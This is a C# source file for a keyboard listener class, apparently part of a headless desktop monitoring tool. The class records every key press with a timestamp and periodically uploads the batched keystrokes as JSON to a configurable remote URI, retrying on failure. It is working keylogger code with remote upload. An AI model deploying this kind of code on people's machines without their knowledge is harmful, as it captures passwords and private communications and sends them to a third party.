namespace EMS.Desktop.Headless
{
    using System;
    using System.Collections.Concurrent;
    using System.Collections.Generic;
    using System.Threading;
    using System.Threading.Tasks;
    using Core.Interfaces;
    using Core.Models;
    using Infrastructure.Common.Configurations.ListenersConfigs;
    using Infrastructure.Common.Enums;
    using Infrastructure.Common.Providers;
    using Polly;

    public class KeyboardListener : BaseListener
    {
        private const int DefaultDueTime = 5000;
        private const int DefaultPeriod = 2000;
        private IKeyboardApi keyboardApi;
        private ConcurrentQueue<KeyCapturedDetails> capturedKeys;
        private KeyboardListenerConfig config;
        private Timer sendCapturedKeysTimer;

        public KeyboardListener(IHttpClient httpClient, IKeyboardApi keyboardApi, KeyboardListenerConfig config)
            : base(httpClient)
        {
            this.config = config;
            this.keyboardApi = keyboardApi;
            this.capturedKeys = new ConcurrentQueue<KeyCapturedDetails>();
        }

        public override Task Start()
        {
            this.sendCapturedKeysTimer = InitializeTimer();
            this.keyboardApi.OnKeyPressed += KeyboardApi_OnKeyPressed;
            return Task.Run(() => this.keyboardApi.StartListeningToKeyboard());
        }

        public override void Stop()
        {
            this.keyboardApi.StopListeningToKeyboard();
        }

        private Timer InitializeTimer()
        {
            var dueTime = this.config.SendCapturedKeysTimerConfig != null ?
                this.config.SendCapturedKeysTimerConfig.DueTime :
                DefaultDueTime;

            var period = this.config.SendCapturedKeysTimerConfig != null ?
              this.config.SendCapturedKeysTimerConfig.Period :
              DefaultPeriod;

            return new Timer(
                async (_) => await this.SendCapturedKeys(),
                null,
                dueTime,
                period);
        }

        private void KeyboardApi_OnKeyPressed(object sender, KeyboardKey e)
        {
            var capturedKey = new KeyCapturedDetails
            {
                KeyboardKey = e,
                CapturedOn = TimeProvider.Current.Now
            };

            Console.WriteLine($"{capturedKey.CapturedOn} - {capturedKey.KeyboardKey}");
            this.capturedKeys.Enqueue(capturedKey);
        }

        private async Task SendCapturedKeys()
        {
            var capturedKeysCount = this.capturedKeys.Count;

            if (capturedKeysCount >= this.config.CapturedKeysThreshold)
            {
                var isSuccessful = true;
                var key = default(KeyCapturedDetails);
                var keysToSend = new List<KeyCapturedDetails>(capturedKeysCount + 1);

                for (int i = 0; i < capturedKeysCount && isSuccessful; i++)
                {
                    isSuccessful = this.capturedKeys.TryDequeue(out key);

                    if (isSuccessful)
                    {
                        keysToSend.Add(key);
                    }
                }

                await Policy
                   .Handle<Exception>()
                   .WaitAndRetry(this.config.RetrySleepDurations, this.OnSendCapturedKeysRetry)
                   .Execute(
                     async () =>
                     {
                         var response = await this.httpClient.PostAsJsonAsync(this.config.DestinationUri, keysToSend);
                         response.EnsureSuccessStatusCode();
                     });
            }
        }

        private void OnSendCapturedKeysRetry(Exception exc, TimeSpan waitTime)
        {
            // Log exception and request params 
        }
    }
}
